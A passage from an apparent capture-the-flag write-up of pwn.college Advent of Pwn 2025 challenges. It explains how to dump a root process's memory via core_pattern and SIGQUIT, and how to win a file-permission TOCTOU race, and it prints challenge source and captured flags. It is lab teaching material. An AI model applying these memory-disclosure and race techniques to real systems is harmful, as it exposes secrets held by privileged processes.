    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">gift</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">gift</span><span class="p">));</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"read"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">wrap</span><span class="p">(</span><span class="n">gift</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">"üéÑ Merry Christmas!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">gift</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div></details> <details> <summary>Click to view <code>init-coal.sh</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">set</span> <span class="nt">-eu</span>

mount <span class="nt">-o</span> remount,rw /proc/sys
<span class="nb">echo </span>coal <span class="o">&gt;</span> /proc/sys/kernel/core_pattern
mount <span class="nt">-o</span> remount,ro /proc/sys
</pre></table></code></div></div></details><p>We are provided with a binary claus, its source code claus.c, and a setup script init-coal.sh. Overall, the binary reads</p><p>a flag into memory and ‚Äúwrap‚Äù it with <code class="language-plaintext highlighter-rouge">#</code>.</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">gift</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
<span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">gift</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">gift</span><span class="p">));</span>
<span class="p">...</span>
<span class="n">wrap</span><span class="p">(</span><span class="n">gift</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
<span class="p">...</span>
<span class="n">puts</span><span class="p">(</span><span class="n">gift</span><span class="p">);</span>
</pre></table></code></div></div><p>The key observations that inside <code class="language-plaintext highlighter-rouge">warp()</code>:</p><ul><li><p><code class="language-plaintext highlighter-rouge">sleep(1)</code></p><li><p>Then <code class="language-plaintext highlighter-rouge">gift[i] = "#####\n"[i % 6];</code> ‚Ä¶</p><p>So the buffer <code class="language-plaintext highlighter-rouge">gift</code> still contains the flag, but each byte is overwritten one by one with <code class="language-plaintext highlighter-rouge">#</code> after a 1 second delay.</p></ul><p>Furthermore, in <code class="language-plaintext highlighter-rouge">init-coal.sh</code>, it changes <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/core_pattern</code> to the literal string coal. According to <code class="language-plaintext highlighter-rouge">man 5 core</code>, when core_pattern does not start with <code class="language-plaintext highlighter-rouge">|</code>, it is treated as the filename template for core dumps. In our case, every time a process dumps core, the kernel will write a file named <code class="language-plaintext highlighter-rouge">coal</code> in the current working directory of the crashing process.</p><p>So if we can make claus crash while the flag is still sitting in gift, we‚Äôll get a file called coal that is a snapshot of</p><p>the process‚Äôs memory ‚Äì including the flag.</p><h3 id="exploitation-1"><span class="me-2">Exploitation</span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I incidentally found this <a href="https://askubuntu.com/questions/1349047/where-do-i-find-core-dump-files-and-how-do-i-view-and-analyze-the-backtrace-st">blog</a> that explains how to generate, view and analyze core dumps.</p><p>We first run</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">ulimit</span> <span class="nt">-c</span> unlimited
</pre></table></code></div></div><p>to set the soft RLIMIT_CORE resource limit to ‚Äúunlimited‚Äù, so that when claus crashes it actually produces a core file.</p><p>Next, we need a signal whose default action is to terminate the process and produce a core dump.</p><ul><li><p><code class="language-plaintext highlighter-rouge">SIGINT</code> (Ctrl+C) only terminates the process without generating a core.</p><li><p><code class="language-plaintext highlighter-rouge">SIGTSTP</code> (Ctrl+Z) which normally stops the process, but in this challenge SIGTSTP is caught and ignored it.</p></ul><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">sigtstp_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">signum</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"üéÖ Santa won't stop!"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><ul><li><p><code class="language-plaintext highlighter-rouge">SIGQUIT</code> (Ctrl+\) will terminates the process and produces a core dump.</p><p>However, after causing core dump, we don‚Äôt have permission to read the core file:</p></ul><p><a href="/assets/img/AdventOfPwn2025/pic3.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic3.png" alt="Desktop View" width="600" height="300" loading="lazy"></a></p><p>The challenge run as root:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">ruid</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setreuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/proc/self/exe"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>But there is may be a hint in the description:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>You really should [start here](https://pwn.college/welcome/welcome/) if you're new to the dojo or could use a refresher.
</pre></table></code></div></div><p>At <code class="language-plaintext highlighter-rouge">Using Privileged Mode</code> said that If you launch the challenge in <code class="language-plaintext highlighter-rouge">Privileged mode</code>, it will grant you</p><p>administrative privileges. So we can use <code class="language-plaintext highlighter-rouge">sudo</code> to read the core file. Furthermore, the folder <code class="language-plaintext highlighter-rouge">/home/hacker</code> is saved</p><p>across challenge restarts, so we can cause the core dump to be saved there.</p><p>POC:</p><p><a href="/assets/img/AdventOfPwn2025/pic4.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic4.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{oKntyuu3VV8uDHlHMZOnYqGvS5S.0FO3gTMywiN1UDN0EzW}</code></p><hr /><h2 id="day03"><span class="me-2">Day03</span><a href="#day03" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-2"><span class="me-2">Description</span><a href="#description-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><strong>üéÑ Issue: Stocking delivery misroutes gifts to root under ‚Äúsleeping nicely‚Äù conditions</strong></p><p>Labels: <code class="language-plaintext highlighter-rouge">bug</code>, <code class="language-plaintext highlighter-rouge">priority-high</code>, <code class="language-plaintext highlighter-rouge">santa-infra</code>, <code class="language-plaintext highlighter-rouge">northpole-delivery</code></p><p><strong>Description</strong></p><p>During the annual holiday deployment cycle, the <code class="language-plaintext highlighter-rouge">stuff-stocking</code> service incorrectly delivered a user‚Äôs gift into a stocking owned by root. This occurs as soon as the ‚Äúchildren sleeping nicely‚Äù signal fires, which triggers Santa‚Äôs stocking-fill workflow (SLEIGH-RFC-1225).</p><p>Once the condition triggers, <code class="language-plaintext highlighter-rouge">/stocking</code>‚Äîcreated prematurely and owned by root‚Äîis sealed and the gift is written inside, leaving the intended recipient empty-handed.</p><p><strong>Expected Behavior</strong></p><p>The stocking-stuffer service should:</p><ol><li>Create <code class="language-plaintext highlighter-rouge">/stocking</code> with ownership set to the correct child (UID 1000)<li>Wait for at least one nicely sleeping child (positive-nice sleep process)<li>Deliver the gift into that child‚Äôs stocking<li>Lock down permissions<li>Preserve overall Christmas cheer</ol><p><strong>Actual Behavior</strong></p><ol><li><code class="language-plaintext highlighter-rouge">/flag</code> is read and removed (expected)<li><code class="language-plaintext highlighter-rouge">/stocking</code> is created early and owned by root<li>When the ‚Äúsleeping nicely‚Äù condition succeeds, Santa seals the stocking (<code class="language-plaintext highlighter-rouge">chmod 400</code>)<li>Gift is written into root‚Äôs stocking (root did not ask Santa for a flag)<li>The intended user cannot access their gift</ol><p><strong>Reproduction Steps</strong></p><ol><li>Launch <code class="language-plaintext highlighter-rouge">stuff-stocking</code><li>Allow any child process to begin ‚Äúsleeping nicely‚Äù (nice &gt; 0)<li>Inspect <code class="language-plaintext highlighter-rouge">/stocking</code> ownership<li>Observe gift delivery into root‚Äôs stocking<li>Whisper ‚ÄúHo ho no‚Ä¶‚Äù</ol><p><strong>Additional Notes</strong></p><ul><li>Misrouting likely caused by a mix-up in Santa‚Äôs recipient ledger (possibly outdated naughty/nice metadata).<li>Elves report that stocking creation timing can influence the eventual recipient, although this is not documented behavior.<li>Root maintains they ‚Äúreally don‚Äôt need more things to maintain.‚Äù<li>Internal SIRE notes indicate the team was ‚Äúracing to finish delivering all gifts before sunrise,‚Äù which may have contributed to insufficient review of stocking ownership logic.<li>Holiday deadlines continue to present organizational risk.</ul><p><strong>Impact</strong></p><p>High. Users expecting gifts may instead receive nothing, while root receives gifts they did not ask for and cannot appreciate.</p><p><strong>üéÅ Proposed Fix</strong></p><p>Assign the correct ownership to <code class="language-plaintext highlighter-rouge">/stocking</code> before Santa seals it.</p><p>Patch</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>diff <span class="nt">--git</span> a/stuff-stocking b/stuff-stocking
index 614b458..e441bfe 100755
<span class="nt">---</span> a/stuff-stocking
+++ b/stuff-stocking
@@ <span class="nt">-19</span>,4 +19,5 @@ <span class="k">until </span>sleeping_nice<span class="p">;</span> <span class="k">do
 done

 </span><span class="nb">chmod </span>400 /stocking
+chown 1000:1000 /stocking
 <span class="nb">printf</span> <span class="s2">"%s"</span> <span class="s2">"</span><span class="nv">$GIFT</span><span class="s2">"</span> <span class="o">&gt;</span> /stocking
</pre></table></code></div></div><p>This ensures gifts reach the intended child instead of quietly accumulating in root‚Äôs stocking.</p><p><strong>üõ†Ô∏è SantaOps Commentary</strong></p><p>‚ÄúThis misdelivery stemmed from high seasonal load, compressed review cycles, and an unhealthy reliance on ‚Äòit worked last year.‚Äô SIRE will enforce a freeze on last-minute changes after the ‚Äòsleeping nicely‚Äô cutoff to prevent further stocking misroutes.‚Äù</p><ul><li>Santa Infrastructure Reliability Engineering (SIRE)</ul><hr /><h3 id="analysis-2"><span class="me-2">Analysis</span><a href="#analysis-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>stuff-stocking</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">set</span> <span class="nt">-eu</span>

<span class="nv">GIFT</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> /flag<span class="si">)</span><span class="s2">"</span>
<span class="nb">rm</span> /flag

<span class="nb">touch</span> /stocking

sleeping_nice<span class="o">()</span> <span class="o">{</span>
    ps ao ni,comm <span class="nt">--no-headers</span> <span class="se">\</span>
        | <span class="nb">awk</span> <span class="s1">'$1 &gt; 0'</span> <span class="se">\</span>
        | <span class="nb">grep</span> <span class="nt">-q</span> <span class="nb">sleep</span>
<span class="o">}</span>

<span class="c"># Only when children sleep sweetly and nice does Santa begin his flight</span>
<span class="k">until </span>sleeping_nice<span class="p">;</span> <span class="k">do
    </span><span class="nb">sleep </span>0.1
<span class="k">done

</span><span class="nb">chmod </span>400 /stocking
<span class="nb">printf</span> <span class="s2">"%s"</span> <span class="s2">"</span><span class="nv">$GIFT</span><span class="s2">"</span> <span class="o">&gt;</span> /stocking
</pre></table></code></div></div></details> <details> <summary>Click to view <code>init-stuff-stocking.sh</code></summary><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

/challenge/stuff-stocking &amp;
</pre></table></code></div></div></details><p>The challenge give up a shell script <code class="language-plaintext highlighter-rouge">stuff-stocking</code> run with root(<code class="language-plaintext highlighter-rouge">init-stuff-stocking.sh</code>) run right after the container starts.</p><ul><li><p>It reads the flag from <code class="language-plaintext highlighter-rouge">/flag</code> into variable <code class="language-plaintext highlighter-rouge">$GIFT</code> and then deletes <code class="language-plaintext highlighter-rouge">rm /flag</code>.</p><li><p>Loop <code class="language-plaintext highlighter-rouge">sleeping_nice()</code> checks if there is any process with positive nice value (i.e., <code class="language-plaintext highlighter-rouge">nice &gt; 0</code>).</p><li><p>In <code class="language-plaintext highlighter-rouge">ps</code>, <code class="language-plaintext highlighter-rouge">ni</code> is the nice value of the process, and <code class="language-plaintext highlighter-rouge">comm</code> is the command name.</p><li><p>Continuously check if any sleeping process has nice &gt; 0.</p><li><p>If satisfied, then change file permission to read-only for the owner</p></ul><p>=&gt; TOCTOU (Time of Check to Time of Use)</p><blockquote class="prompt-tip"><p><a href="https://www.howtoforge.com/linux-nice-command/#:~:text=The%20power%20of%20the%20Linux,process%20group%20causes%20all%20pro?">More about <code class="language-plaintext highlighter-rouge">nice</code></a></p></blockquote><hr /><h3 id="exploitation-2"><span class="me-2">Exploitation</span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ubuntu@2025~day-03:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /stocking 
<span class="nt">-rw-r--r--</span> 1 root root 0 Dec  3 12:10 /stocking
</pre></table></code></div></div><p>So we can pre-open <code class="language-plaintext highlighter-rouge">/stocking</code> and keep reading it. Then trigger condition to get flag.</p><p>POC:</p><p><a href="/assets/img/AdventOfPwn2025/pic5.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic5.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><p>Flag: <code class="language-plaintext highlighter-rouge">pwn.college{gAYsiEAy366n3ti2_8ZeKdQlzFV.0FN4gTMywiN1UDN0EzW}</code></p><hr /><h2 id="day04"><span class="me-2">Day04</span><a href="#day04" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="description-3"><span class="me-2">Description</span><a href="#description-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Every Christmas Eve, Santa‚Äôs reindeer take to the skies‚Äîbut not through holiday magic. Their whole flight control stack runs on <strong>pure eBPF</strong>, uplinked straight into <em>the</em> North Pole, a massive kprobe the reindeer feed telemetry into mid-flight. The ever-vigilant eBPF verifier rejects anything even <em>slightly</em> questionable, which is why the elves spend most of December hunched over terminals, running <code class="language-plaintext highlighter-rouge">llvm-objdump</code> on sleigh binaries and praying nothing in the control path gets inlined into oblivion <em>again</em>. It‚Äôs all very festive, in a high-performance-kernel-engineering sort of way. Ho ho .ko!</p><hr /><h3 id="analysis-3"><span class="me-2">Analysis</span><a href="#analysis-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><details> <summary>Click to view <code>northpole.c</code></summary><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
</pre><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;ctype.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="k">static</span> <span class="k">volatile</span> <span class="kt">sig_atomic_t</span> <span class="n">stop</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">handle_sigint</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">sig</span><span class="p">;</span>
    <span class="n">stop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">libbpf_print_fn</span><span class="p">(</span><span class="k">enum</span> <span class="n">libbpf_print_level</span> <span class="n">level</span><span class="p">,</span>
                           <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="kt">va_list</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">vfprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">broadcast_cheer</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">libbpf_set_print</span><span class="p">(</span><span class="n">libbpf_print_fn</span><span class="p">);</span>
    <span class="n">libbpf_set_strict_mode</span><span class="p">(</span><span class="n">LIBBPF_STRICT_ALL</span><span class="p">);</span>

    <span class="kt">DIR</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">"/dev/pts"</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">de</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">banner</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">d</span><span class="p">)</span>
        <span class="k">return</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ffd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">flag</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
        <span class="n">close</span><span class="p">(</span><span class="n">ffd</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s">"no-flag</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">snprintf</span><span class="p">(</span>
        <span class="n">banner</span><span class="p">,</span>
        <span class="k">sizeof</span><span class="p">(</span><span class="n">banner</span><span class="p">),</span>
        <span class="s">"üéÖ üéÑ üéÅ </span><span class="se">\x1b</span><span class="s">[1;31mHo Ho Ho</span><span class="se">\x1b</span><span class="s">[0m, </span><span class="se">\x1b</span><span class="s">[1;32mMerry Christmas!</span><span class="se">\x1b</span><span class="s">[0m</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"%s"</span><span class="p">,</span>
        <span class="n">flag</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">((</span><span class="n">de</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span> <span class="o">=</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">;</span>
        <span class="kt">size_t</span> <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
        <span class="n">bool</span> <span class="n">all_digits</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'.'</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">"ptmx"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">isdigit</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="p">{</span>
                <span class="n">all_digits</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">all_digits</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"/dev/pts/%s"</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_NOCTTY</span> <span class="o">|</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">"</span><span class="se">\x1b</span><span class="s">[2J</span><span class="se">\x1b</span><span class="s">[H"</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">banner</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">banner</span><span class="p">));</span>
        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">closedir</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">bpf_object</span> <span class="o">*</span><span class="n">obj</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">bpf_program</span> <span class="o">*</span><span class="n">prog</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">bpf_link</span> <span class="o">*</span><span class="n">link</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">success</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">map_fd</span><span class="p">;</span>
    <span class="n">__u32</span> <span class="n">key0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">should_broadcast</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">libbpf_set_strict_mode</span><span class="p">(</span><span class="n">LIBBPF_STRICT_ALL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

